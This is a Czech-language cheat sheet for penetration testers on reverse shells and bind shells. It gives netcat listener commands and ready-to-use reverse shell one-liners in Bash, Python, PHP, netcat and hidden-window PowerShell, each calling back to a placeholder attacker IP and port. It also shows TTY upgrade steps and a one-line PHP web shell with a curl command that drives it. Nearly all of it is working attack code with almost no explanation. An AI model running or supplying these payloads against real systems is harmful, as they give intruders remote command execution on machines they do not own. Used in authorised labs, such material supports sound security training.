# Reverse Shells & Bind Shells

## Koncepty

**Reverse shell**: oběť se připojuje k útočníkovi
**Bind shell**: útočník se připojuje k oběti

## Listener (útočník)

```bash
# Základní netcat listener
nc -lvnp 4444

# Stabilnější s rlwrap (history, šipky)
rlwrap nc -lvnp 4444
```

## Reverse Shell One-liners

### Bash
```bash
bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
bash -c 'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1'
```

### Python
```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

### PHP
```bash
php -r '$sock=fsockopen("<IP>",<PORT>);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### Netcat
```bash
nc -e /bin/bash <IP> <PORT>
# Bez -e (OpenBSD nc)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> <PORT> >/tmp/f
```

### PowerShell (Windows)
```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("<IP>",<PORT>);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length))-ne 0){;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+"PS "+(pwd).Path+"> ";$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

## Upgrade na plný TTY (Linux)

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

## Web Shells

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
curl "http://<IP>/shell.php?cmd=id"
```

## Generátor shellu
Použij: https://www.revshells.com/
